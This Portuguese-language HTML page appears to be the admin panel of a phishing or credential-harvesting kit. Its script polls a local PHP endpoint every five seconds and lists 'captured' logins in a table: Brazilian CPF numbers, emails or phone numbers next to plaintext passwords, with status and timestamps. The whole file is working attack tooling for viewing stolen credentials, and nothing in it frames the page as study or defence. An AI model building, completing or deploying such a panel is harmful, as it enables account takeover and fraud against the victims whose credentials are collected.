<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Admin - Capturas de Login</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f4f4f4; }
        h1 { text-align: center; }
        table { width: 100%; border-collapse: collapse; background-color: white; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        th, td { padding: 12px; border: 1px solid #ddd; text-align: left; }
        th { background-color: #009ee3; color: white; }
        tr:nth-child(even) { background-color: #f9f9f9; }
    </style>
</head>
<body>
    <h1>Painel de Administração - Capturas</h1>
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>Identificador (CPF/Email/Telefone)</th>
                <th>Senha</th>
                <th>Status</th>
                <th>Data e Hora</th>
            </tr>
        </thead>
        <tbody id="data-table-body">
            </tbody>
    </table>

    <script>
        async function fetchData() {
            try {
                const response = await fetch('api_get_capturas.php');
                const data = await response.json();
                
                const tableBody = document.getElementById('data-table-body');
                tableBody.innerHTML = ''; // Limpa a tabela antes de preencher

                if(data.success === false) {
                    throw new Error(data.error);
                }

                data.forEach(row => {
                    const tr = document.createElement('tr');
                    tr.innerHTML = `
                        <td>${row.id}</td>
                        <td>${row.identificador}</td>
                        <td>${row.senha || 'N/A'}</td>
                        <td>${row.status}</td>
                        <td>${new Date(row.data_criacao).toLocaleString('pt-BR')}</td>
                    `;
                    tableBody.appendChild(tr);
                });

            } catch (error) {
                console.error('Erro ao buscar dados:', error);
                const tableBody = document.getElementById('data-table-body');
                tableBody.innerHTML = `<tr><td colspan="5" style="text-align:center; color:red;">Falha ao carregar dados.</td></tr>`;
            }
        }

        // Busca os dados quando a página carrega
        fetchData();

        // Atualiza os dados a cada 5 segundos (5000 milissegundos)
        setInterval(fetchData, 5000);
    </script>
</body>
</html>